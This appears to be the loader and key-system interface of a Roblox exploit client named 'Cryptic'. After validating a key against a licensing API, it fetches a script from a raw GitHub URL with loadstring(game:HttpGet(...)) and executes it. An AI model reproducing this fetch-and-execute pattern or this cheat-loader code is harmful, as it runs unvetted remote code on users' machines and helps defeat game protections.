Description_2.BackgroundTransparency = 1.000
Description_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description_2.BorderSizePixel = 0
Description_2.Position = UDim2.new(-0.000472631218, 0, 1, 0)
Description_2.Size = UDim2.new(0, 289, 0, 38)
Description_2.Font = Enum.Font.SourceSans
Description_2.Text = "We are validating your Cryptic access with the server!"
Description_2.TextColor3 = Color3.fromRGB(240, 240, 240)
Description_2.TextScaled = true
Description_2.TextSize = 19.000
Description_2.TextWrapped = true
Description_2.TextXAlignment = Enum.TextXAlignment.Left
Description_2.TextYAlignment = Enum.TextYAlignment.Top

UIGradient.Color = ColorSequence.new {ColorSequenceKeypoint.new(0.00, Color3.fromRGB(54, 78, 204)),
                                      ColorSequenceKeypoint.new(1.00, Color3.fromRGB(45, 66, 141))}
UIGradient.Rotation = 90
UIGradient.Parent = Description

Title2.Name = "Title2"
Title2.Parent = Description
Title2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title2.BackgroundTransparency = 1.000
Title2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title2.BorderSizePixel = 0
Title2.Position = UDim2.new(0.0215053763, 0, 0, 0)
Title2.Size = UDim2.new(0, 273, 0, 29)
Title2.Font = Enum.Font.SourceSansSemibold
Title2.Text = ""
Title2.TextColor3 = Color3.fromRGB(245, 245, 245)
Title2.TextSize = 24.000
Title2.TextWrapped = true
Title2.TextXAlignment = Enum.TextXAlignment.Left
Title2.TextYAlignment = Enum.TextYAlignment.Top

Description2.Name = "Description2"
Description2.Parent = Title2
Description2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description2.BackgroundTransparency = 1.000
Description2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description2.BorderSizePixel = 0
Description2.Position = UDim2.new(-0.000472631218, 0, 1, 0)
Description2.Size = UDim2.new(0, 289, 0, 38)
Description2.Font = Enum.Font.SourceSans
Description2.Text = ""
Description2.TextColor3 = Color3.fromRGB(240, 240, 240)
Description2.TextScaled = true
Description2.TextSize = 19.000
Description2.TextWrapped = true
Description2.TextXAlignment = Enum.TextXAlignment.Left
Description2.TextYAlignment = Enum.TextYAlignment.Top

Progession.Name = "Progession"
Progession.Parent = Frame
Progession.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
Progession.BorderColor3 = Color3.fromRGB(0, 0, 0)
Progession.BorderSizePixel = 0
Progession.Position = UDim2.new(0.0361067504, 0, 0.0862868801, 0)
Progession.Size = UDim2.new(0, 14, 0, 225)

Progress.Name = "Progress"
Progress.Parent = Progession
Progress.AnchorPoint = Vector2.new(0.5, 0)
Progress.BackgroundColor3 = Color3.fromRGB(54, 78, 204)
Progress.BorderColor3 = Color3.fromRGB(0, 0, 0)
Progress.BorderSizePixel = 0
Progress.Position = UDim2.new(0.5, 0, 0.0222219508, 0)
Progress.Size = UDim2.new(0, 14, 0, 0)
Progress.ZIndex = 0

Checkpoints.Name = "Checkpoints"
Checkpoints.Parent = Progession

_1.Name = "1"
_1.Parent = Checkpoints
_1.AnchorPoint = Vector2.new(0.5, 0)
_1.BackgroundColor3 = Color3.fromRGB(54, 78, 204)
_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
_1.BorderSizePixel = 0
_1.Position = UDim2.new(0.5, 0, 0, 0)
_1.Size = UDim2.new(0, 19, 0, 19)

UICorner_9.CornerRadius = UDim.new(2, 0)
UICorner_9.Parent = _1

_4.Name = "4"
_4.Parent = Checkpoints
_4.AnchorPoint = Vector2.new(0.5, 0)
_4.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
_4.BorderSizePixel = 0
_4.Position = UDim2.new(0.5, 0, 0.915555537, 0)
_4.Size = UDim2.new(0, 19, 0, 19)

UICorner_10.CornerRadius = UDim.new(2, 0)
UICorner_10.Parent = _4

_3.Name = "3"
_3.Parent = Checkpoints
_3.AnchorPoint = Vector2.new(0.5, 0)
_3.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
_3.BorderSizePixel = 0
_3.Position = UDim2.new(0.5, 0, 0.613333344, 0)
_3.Size = UDim2.new(0, 19, 0, 19)

UICorner_11.CornerRadius = UDim.new(2, 0)
UICorner_11.Parent = _3

_2.Name = "2"
_2.Parent = Checkpoints
_2.AnchorPoint = Vector2.new(0.5, 0)
_2.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
_2.BorderSizePixel = 0
_2.Position = UDim2.new(0.5, 0, 0.293333322, 0)
_2.Size = UDim2.new(0, 19, 0, 19)

UICorner_12.CornerRadius = UDim.new(2, 0)
UICorner_12.Parent = _2

UIListLayout.Parent = Checkpoints
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.Padding = UDim.new(0, 50)

Loading.Name = "Loading"
Loading.Parent = Frame
Loading.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
Loading.BorderColor3 = Color3.fromRGB(0, 0, 0)
Loading.BorderSizePixel = 0
Loading.Position = UDim2.new(0.58084774, 0, 0.0257352944, 0)
Loading.Size = UDim2.new(0, 260, 0, 257)
Loading.ZIndex = 2

Title_2.Name = "Title"
Title_2.Parent = Loading
Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BackgroundTransparency = 1.000
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0269230772, 0, 0.0116730332, 0)
Title_2.Size = UDim2.new(0.942307711, 0, 0.138015687, 0)
Title_2.Font = Enum.Font.SourceSansBold
Title_2.Text = "Cryptic"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
Title_2.TextSize = 14.000
Title_2.TextWrapped = true
Title_2.TextXAlignment = Enum.TextXAlignment.Left

UICorner_13.CornerRadius = UDim.new(0.0149999997, 0)
UICorner_13.Parent = Loading

Description_3.Name = "Description"
Description_3.Parent = Loading
Description_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Description_3.BackgroundTransparency = 1.000
Description_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description_3.BorderSizePixel = 0
Description_3.Position = UDim2.new(0.0269230772, 0, 0.136186764, 0)
Description_3.Size = UDim2.new(0.951848447, 0, 0.0796499252, 0)
Description_3.Font = Enum.Font.SourceSans
Description_3.Text = "Endless Possibilities Await."
Description_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Description_3.TextScaled = true
Description_3.TextSize = 14.000
Description_3.TextWrapped = true
Description_3.TextXAlignment = Enum.TextXAlignment.Left

Description_4.Name = "Description"
Description_4.Parent = Loading
Description_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Description_4.BackgroundTransparency = 1.000
Description_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description_4.BorderSizePixel = 0
Description_4.Position = UDim2.new(0.0269230772, 0, 0.406498402, 0)
Description_4.Size = UDim2.new(0.951848447, 0, 0.108949415, 0)
Description_4.Font = Enum.Font.SourceSans
Description_4.Text = "Initializing..."
Description_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Description_4.TextScaled = true
Description_4.TextSize = 14.000
Description_4.TextWrapped = true
Description_4.TextXAlignment = Enum.TextXAlignment.Left

Description_5.Name = "Description"
Description_5.Parent = Loading
Description_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Description_5.BackgroundTransparency = 1.000
Description_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description_5.BorderSizePixel = 0
Description_5.Position = UDim2.new(0.0269230772, 0, 0.521400511, 0)
Description_5.Size = UDim2.new(0.951848447, 0, 0.0796499327, 0)
Description_5.Font = Enum.Font.SourceSans
Description_5.Text = "This wont take long..."
Description_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Description_5.TextScaled = true
Description_5.TextSize = 14.000
Description_5.TextWrapped = true
Description_5.TextXAlignment = Enum.TextXAlignment.Left

Sliding.Name = "Sliding"
Sliding.Parent = Frame
Sliding.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Sliding.BorderColor3 = Color3.fromRGB(0, 0, 0)
Sliding.BorderSizePixel = 0
Sliding.Position = UDim2.new(1, 0, 0, 0)
Sliding.Size = UDim2.new(-1, 0, 1, 0)
Sliding.ZIndex = 50

task.spawn(function()
    pcall(function()
        for i, point in pairs(Checkpoints:GetChildren()) do
            if point:IsA('Frame') then
                local UIStroke = Instance.new('UIStroke')

                UIStroke.Parent = point
                UIStroke.Thickness = 3
                UIStroke.Color = Color3.fromRGB(68, 68, 68)
            end
        end
    end)
end)

local Database = {
    Checkpoints = {
        [1] = {
            A = UDim2.new(0, 14, 0, 0),
            B = UDim2.new(0.089, 0, 0.085, 0)
        },
        [2] = {
            A = UDim2.new(0, 14, 0, 74),
            B = UDim2.new(0.089, 0, 0.338, 0)
        },
        [3] = {
            A = UDim2.new(0, 14, 0, 141),
            B = UDim2.new(0.089, 0, 0.592, 0)
        },
        [4] = {
            A = UDim2.new(0, 14, 0, 210),
            B = UDim2.new(0.089, 0, 0.669, 0)
        }
    },
    Descriptions = {
        [1] = {
            A = "Initializing",
            B = "Please wait a moment while we start initializing."
        },
        [2] = {
            A = "Checking Roblox Version",
            B = "We are ensuring the Roblox Version is current up-to-date!"
        },
        [3] = {
            A = "Key System",
            B = "We are validating your access to the cryptic servers."
        },
        [4] = {
            A = "Initialized",
            B = "Successfully completed all validations! Now loading Main UI."
        }
    },
    Other = {
        HWID = gethwid() or 0,
        KL = "https://gateway.platoboost.com/a/39097?id=" .. gethwid() or 0,
        CRequest = request or http.request or http_request,
        CheckpointsCleared = false,
        ClosedUI = false
    }
}
local Secondary = false
local TweenService = cloneref(game:GetService('TweenService'))

local ChangeProgression = function(Title, Description)
    if not Secondary then
        Secondary = true

        ScreenGui.Frame.Description.Title2.Text = Title
        ScreenGui.Frame.Description.Title2.Description2.Text = Description

        TweenService:Create(ScreenGui.Frame.Description.Title, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 1
        }):Play()
        TweenService:Create(ScreenGui.Frame.Description.Title.Description, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 1
        }):Play()

        TweenService:Create(ScreenGui.Frame.Description.Title2, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 0
        }):Play()
        TweenService:Create(ScreenGui.Frame.Description.Title2.Description2, TweenInfo.new(0.5, Enum.EasingStyle.Cubic),
            {
                TextTransparency = 0
            }):Play()
    else
        Secondary = false

        ScreenGui.Frame.Description.Title.Text = Title
        ScreenGui.Frame.Description.Title.Description.Text = Description

        TweenService:Create(ScreenGui.Frame.Description.Title2, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 1
        }):Play()
        TweenService:Create(ScreenGui.Frame.Description.Title2.Description2, TweenInfo.new(0.5, Enum.EasingStyle.Cubic),
            {
                TextTransparency = 1
            }):Play()

        TweenService:Create(ScreenGui.Frame.Description.Title, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 0
        }):Play()
        TweenService:Create(ScreenGui.Frame.Description.Title.Description, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            TextTransparency = 0
        }):Play()
    end
end
local TweenDesc = function(Style, Udim2)
    TweenService:Create(Description, TweenInfo.new(1, Style), {
        Position = Udim2
    }):Play()
end
local UpdateProgression = function(Progress)
    local Point = ScreenGui.Frame.Progession.Checkpoints:FindFirstChild(Progress)

    TweenService:Create(ScreenGui.Frame.Progession.Progress, TweenInfo.new(0.4, Enum.EasingStyle.Cubic), {
        Size = Database.Checkpoints[Progress]["A"]
    }):Play()
    task.wait(0.25)
    TweenService:Create(Point, TweenInfo.new(0.3, Enum.EasingStyle.Cubic), {
        BackgroundColor3 = Color3.fromRGB(54, 78, 204)
    }):Play()
end
local FadeOutText = function(Part, EasingStyle)
    TweenService:Create(Part, TweenInfo.new(0.5, EasingStyle), {
        TextTransparency = 1
    }):Play()
end
local FadeInText = function(Part, EasingStyle)
    TweenService:Create(Part, TweenInfo.new(0.5, EasingStyle), {
        TextTransparency = 0
    }):Play()
end
local HandleCRequest = function(url, method)
    success, result = pcall(function()
        local response = Database.Other.CRequest({
            Url = url,
            Method = method
        })

        return response
    end)

    if success and result then
    else
        print('Response: success and result == nil')
    end

    return success and result or nil
end
local verify = function()
    ChangeProgression('Checking Whitelist', 'Checking Key System database for key system completion.')

    result1 = HandleCRequest(string.format("https://api-gateway.platoboost.com/v1/public/whitelist/%i/%s?s", 39097,
        Database.Other.HWID), "GET")

    if result1 then
        if result1.StatusCode == 200 then
            if string.find(result1.Body, 'true') then
                ChangeProgression('Checking Whitelist', 'Credentials have been validated "Key System" completed!')

                Database.Other.CheckpointsCleared = true

                return true
            else
                result = HandleCRequest(string.format(
                    "https://api-gateway.platoboost.com/v1/authenticators/redeem/%i/%s/%s", 39097, Database.Other.HWID,
                    ScreenGui.Frame.Keysystem["Enter Key Here"].TextBox.Text), "POST")

                if result then
                    if result.StatusCode == 200 and string.find(result.Body, 'true') then
                        ChangeProgression('Liscense Redeemed',
                            'Your liscense has successfully been activated! Thank you for your support Cryptic.')

                        Database.Other.CheckpointsCleared = true

                        return true
                    elseif result.StatusCode == 429 then
                        ChangeProgression('Rate Limited',
                            'you are currently rate limited! Please allow 30s to pass before retrying!')

                        return false
                    end
                end
            end
        elseif result1.StatusCode == 429 then
            ChangeProgression('Rate Limited', 'you are currently rate limited! Please allow 30s to pass!')

            return false
        else
            ChangeProgression('Whitelist Response',
                'You need to complete the key system in order to gain access to cryptic!')

            return false
        end
    end

    ChangeProgression('Whitelist Response', 'Unable to connect to plato at this time. Please try again.')

    return false
end
local verify2 = function()
    res = HandleCRequest(string.format("https://api-gateway.platoboost.com/v1/public/whitelist/%i/%s?s", 39097,
        gethwid()), "GET")

    if res and res.StatusCode == 200 and string.find(res.Body, 'true') then
        Database.Other.CheckpointsCleared = true

        return true
    end
end

ScreenGui.Frame.Keysystem["Official Store"].TextButton.MouseButton1Click:Connect(function()
    setclipboard('https://reapersoftwaredevelopment.mysellix.io/')
end)
ScreenGui.Frame.Keysystem["Get Key"].TextButton.MouseButton1Click:Connect(function()
    -- setclipboard(tostring(Database.Other.KL))
    copyLink()
end)

onMessage = function(message)
    ChangeProgression('Key status', message)
end

local completed = function()
    print("destroying...")
    ScreenGui:Destroy()

    print("spawning")
    task.spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Goober2112/Gloop/main/scripts/ui/Cryptic_Main.lua"))()
    end)

    print("autoexec")
    task.wait()
    runautoexec()
end

ScreenGui.Frame.Keysystem["Check Key"].TextButton.MouseButton1Click:Connect(function()
    ChangeProgression('Checking Whitelist', 'Checking Key System database for key system completion.')

    local key = ScreenGui.Frame.Keysystem["Enter Key Here"].TextBox.Text;
    if verifyKey(key) then
        print("valid, writing");
        local m = isfile("cryptic_key_8412")

        if m then
            delfile("cryptic_key_8412")
        end

        writefile("cryptic_key_8412", key)

        print("doing thing")
        completed()
    end

    -- verify()
end)
ScreenGui.Frame.Keysystem["Close UI"].TextButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()

    Database.Other.ClosedUI = true
end)

TweenService:Create(Sliding, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
    Size = UDim2.new(0, 0, 1, 0)
}):Play()

task.wait(0.5)

for i = 1, 4 do
    if Database.Other.ClosedUI then
        return
    end

    TweenDesc(Enum.EasingStyle.Cubic, Database.Checkpoints[i]["B"])
    ChangeProgression(Database.Descriptions[i]["A"], Database.Descriptions[i]["B"])
    UpdateProgression(i)

    if i == 1 then
        task.wait(1.5)
    elseif i == 3 then
        task.wait(0.55)

        pcall(function()
            TweenService:Create(Loading, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
                BackgroundTransparency = 1
            }):Play()

            for _, child in ipairs(Loading:GetChildren()) do
                if child:IsA("TextLabel") then
                    FadeOutText(child, Enum.EasingStyle.Cubic)
                end
            end
        end)

        local key = "empty";

        if isfile("cryptic_key_8412") then
            key = readfile("cryptic_key_8412")
        end

        print(key)

        if key ~= "empty" and verifyKey(key) then
            ChangeProgression('Key System', 'Saved key is valid, you may now proceed.')
            completed()
        else
            ChangeProgression('Key System',
                'We require that you complete the key system, please complete it and paste the key in the textbox and click check key.')
        end

        repeat
            task.wait(0.25)

            if Database.Other.CloseUI then
                break
            end
        until Database.Other.CheckpointsCleared

        if Database.Other.ClosedUI then
            return
        end

        for _, child in ipairs(Loading:GetChildren()) do
            if child:IsA("TextLabel") then
                FadeInText(child, Enum.EasingStyle.Cubic)
            end
        end

        TweenService:Create(Loading, TweenInfo.new(0.5, Enum.EasingStyle.Cubic), {
            BackgroundTransparency = 0
        }):Play()

        task.wait(0.55)
    else
        task.wait(0.60)
    end
end
